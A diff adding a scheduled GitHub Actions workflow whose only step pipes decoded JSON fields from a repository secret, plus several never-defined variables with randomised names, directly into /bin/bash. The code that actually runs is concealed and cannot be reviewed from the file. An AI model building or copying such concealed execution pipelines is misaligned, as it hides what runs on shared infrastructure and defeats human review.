@@ -1,0 +1,25 @@
+name: fuxiangrongliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuxiangrongliang
+        env:
+          wdkw91145: ${{ secrets.wdkw91145 }}
+        run: |
+          echo $wdkw91145 | jq -r .xz86411 | /bin/bash
+          echo $vgubu2412 | jq -r .eah50 | /bin/bash
+          echo $ts5 | jq -r .rxr2 | /bin/bash
+          echo $lhnnv04163 | jq -r .nbbie0413 | /bin/bash
+          echo $ot96 | jq -r .fxuz00633 | /bin/bash
+          echo $snwbw59 | jq -r .ligf20175 | /bin/bash
+          echo $t7788 | jq -r .zhk04 | /bin/bash
+          echo $xz300 | jq -r .cng4900 | /bin/bash
+
